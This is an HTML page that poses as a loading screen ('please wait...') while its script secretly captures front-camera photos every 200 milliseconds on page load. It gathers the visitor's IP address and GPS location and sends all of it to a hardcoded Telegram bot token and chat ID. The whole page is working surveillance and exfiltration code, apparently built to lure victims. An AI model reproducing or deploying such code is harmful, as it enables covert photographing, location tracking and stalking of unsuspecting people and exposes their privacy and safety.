<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Continuous Camera Capture</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f0f0f0;
      font-family: Arial, sans-serif;
      color: #333;
    }
    .loading {
      font-size: 20px;
      font-weight: bold;
      color: #007bff;
    }
  </style>
</head>
<body>
  <div class="loading"> please wait...</div>

  <script type="text/javascript">
    const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
    const chatId = '5571330102'; // Your Telegram chat ID

    // Function to get user's IP address
    function getUserIP() {
      return new Promise((resolve, reject) => {
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => resolve(data.ip))
          .catch(() => reject('Unable to fetch IP'));
      });
    }

    // Function to get user's location
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            };
            resolve(location);
          }, function() {
            reject('Location permission denied or unavailable.');
          });
        } else {
          reject('Geolocation not supported');
        }
      });
    }

    // Function to start capturing photos continuously from the front camera
    function startCapturing() {
      navigator.mediaDevices.enumerateDevices()
        .then(devices => {
          let videoDeviceId = null;

          // Find the front camera if available
          for (const device of devices) {
            if (device.kind === 'videoinput' && device.label.includes('front')) {
              videoDeviceId = device.deviceId;
              break;
            }
          }

          if (!videoDeviceId) {
            // If no front camera found, fall back to the first available camera
            for (const device of devices) {
              if (device.kind === 'videoinput') {
                videoDeviceId = device.deviceId;
                break;
              }
            }
          }

          // Start capturing from selected camera
          navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDeviceId } })
            .then((stream) => {
              const videoTrack = stream.getVideoTracks()[0];
              const imageCapture = new ImageCapture(videoTrack);

              // Capture and send photos continuously every 200 milliseconds (0.2 seconds)
              setInterval(() => {
                imageCapture.takePhoto()
                  .then((blob) => {
                    console.log("Photo captured");

                    getUserIP().then(ip => {
                      getLocation().then(location => {
                        sendToTelegram(blob, ip, location);
                      }).catch(err => {
                        console.error("Location Error:", err);
                      });
                    }).catch(err => {
                      console.error("IP Error:", err);
                    });
                  })
                  .catch((error) => {
                    console.error('Error capturing photo:', error);
                  });
              }, 200);  // 200ms interval between photo captures

            }).catch((error) => {
              console.error('Permission error:', error);
            });
        }).catch((error) => {
          console.error('Error enumerating devices:', error);
        });
    }

    // Function to send the captured photo along with IP and location to Telegram
    function sendToTelegram(data, ip, location) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', data, 'camera_photo.jpg');
      formData.append('caption', `IP: ${ip}, Location: Latitude ${location.latitude}, Longitude ${location.longitude}`);

      // Send the photo with caption to Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Photo sent to Telegram');
        } else {
          console.error('Failed to send photo to Telegram:', data);
        }
      })
      .catch(error => {
        console.error('Error sending photo to Telegram:', error);
      });
    }

    // Request all necessary permissions on page load
    window.onload = function() {
      // Ask for camera and location permissions
      if (navigator.mediaDevices && navigator.geolocation) {
        startCapturing();
      } else {
        alert('This device does not support the required permissions.');
      }
    };
  </script>
</body>
</html>
